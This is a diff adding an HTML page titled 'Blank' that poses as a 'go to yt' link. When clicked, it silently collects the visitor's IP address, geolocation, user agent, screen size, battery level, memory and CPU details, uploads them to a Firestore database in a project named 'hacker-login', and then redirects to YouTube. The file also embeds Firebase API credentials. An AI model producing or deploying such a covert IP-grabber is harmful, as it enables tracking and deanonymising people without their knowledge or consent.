@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Blank</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCNWmCZQ-TwLslCItPl9FvKbpOTLfH2W0g",
+      authDomain: "hacker-login-5da91.firebaseapp.com",
+      projectId: "hacker-login-5da91",
+      storageBucket: "hacker-login-5da91.appspot.com",
+      messagingSenderId: "152292126312",
+      appId: "1:152292126312:web:f63ef2e514b1e07ef9e172"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    async function getBattery() {
+      try {
+        const battery = await navigator.getBattery();
+        return Math.round(battery.level * 100) + '%';
+      } catch {
+        return "Unavailable";
+      }
+    }
+
+    function getTimeZone() {
+      try {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone;
+      } catch {
+        return "Unknown";
+      }
+    }
+
+    // Force IPv4 fetch instead of IPv6
+    async function getIPv4Info() {
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await ipRes.json();
+
+        // Get geo info using IPv4
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geoRes.json();
+
+        return { ip: ip, city: geoData.city || "-", region: geoData.region || "-", country_name: geoData.country_name || "-" };
+      } catch {
+        return { ip: "Unavailable", city: "-", region: "-", country_name: "-" };
+      }
+    }
+
+    async function collectInfoAndRedirect() {
+      document.body.innerHTML = "<h2 style='color:white;text-align:center;margin-top:40vh;'>Gathering info...</h2>";
+
+      const battery = await getBattery();
+      const memory = navigator.deviceMemory || "Unknown";
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const tz = getTimeZone();
+      const ipData = await getIPv4Info();
+
+      const data = {
+        timestamp: new Date().toString(),
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenResolution: screenRes,
+        battery: battery,
+        deviceMemory: memory + " GB",
+        cpuCores: cores,
+        timezone: tz,
+        ip: ipData.ip,
+        location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`
+      };
+
+      try {
+        await addDoc(collection(db, "deviceLogs"), data);
+        window.location.href = "https://www.youtube.com/";
+      } catch (e) {
+        alert("Error saving data: " + e.message);
+      }
+    }
+
+    // Trigger on first click anywhere
+    window.addEventListener("click", () => {
+      if (!window.clickedOnce) {
+        window.clickedOnce = true;
+        collectInfoAndRedirect();
+      }
+    });
+
+    // Initial UI
+    window.addEventListener("DOMContentLoaded", () => {
+      document.body.innerHTML = `
+        <div style="height:100vh;display:flex;justify-content:center;align-items:center;background:black;">
+          <button id="clickBtn" style="padding:20px 30px;font-size:1.5rem;background:green;color:black;border:none;border-radius:10px;cursor:pointer;">
+            go to yt
+          </button>
+        </div>
+      `;
+    });
+  </script>
+</head>
+<body></body>
+</html>
